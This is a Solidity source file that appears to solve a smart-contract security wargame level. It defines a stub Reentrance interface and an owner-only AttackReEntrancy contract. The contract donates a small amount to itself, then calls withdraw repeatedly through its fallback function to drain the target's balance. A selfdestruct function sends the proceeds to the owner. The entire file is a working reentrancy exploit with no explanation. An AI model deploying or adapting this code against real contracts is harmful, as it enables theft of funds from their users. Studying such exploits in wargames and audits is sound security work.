//SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.7.0 <0.9.0;

import "./2_Owner.sol";

contract Reentrance {
    function withdraw(uint _amount) public { }
     function donate(address _to) public payable { }
}

contract AttackReEntrancy is Owner {

    uint private amount = 0.001 ether;
    Reentrance private reentrance;

    constructor () payable {

    }

    function setContract(address _contract) external isOwner {
        reentrance = Reentrance(_contract);
    }

    function attackReEntrancy() external isOwner {
        reentrance.withdraw(amount);
    }

    function donateToSelf() external payable isOwner {
        reentrance.donate{value: 0.001 ether}(address(this));
    }

    function kill () external isOwner {
        selfdestruct(payable(msg.sender));
    }

    fallback() external payable {
        reentrance.withdraw(amount);
    }
}